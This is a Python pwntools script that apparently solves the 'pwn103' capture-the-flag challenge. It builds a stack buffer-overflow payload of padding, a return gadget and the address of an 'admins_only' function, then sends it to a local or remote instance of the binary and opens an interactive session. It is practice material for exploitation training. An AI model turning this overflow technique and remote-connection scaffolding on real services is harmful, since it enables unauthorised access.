#!/usr/bin/python3 

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn103-1644300337872.pwn103'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()


payload = flat(
    b'A' * 32,
    b'B' * 8,
    # any ret address will do or +1
    p64(0x401377),
    p64(elf.symbols.admins_only)
    #elf.functions.admins_only  # 0x401554
)

print(elf.functions.admins_only)
print(elf.symbols.admins_only)
# Save the payload to file
write('payload', payload)

print(io.recv().decode())
io.sendline('3')
#print(io.recv().decode())
# Send the payload
io.sendlineafter(b"[pwner]:",payload)
#print(io.recv().decode())

# Receive the flag
io.interactive()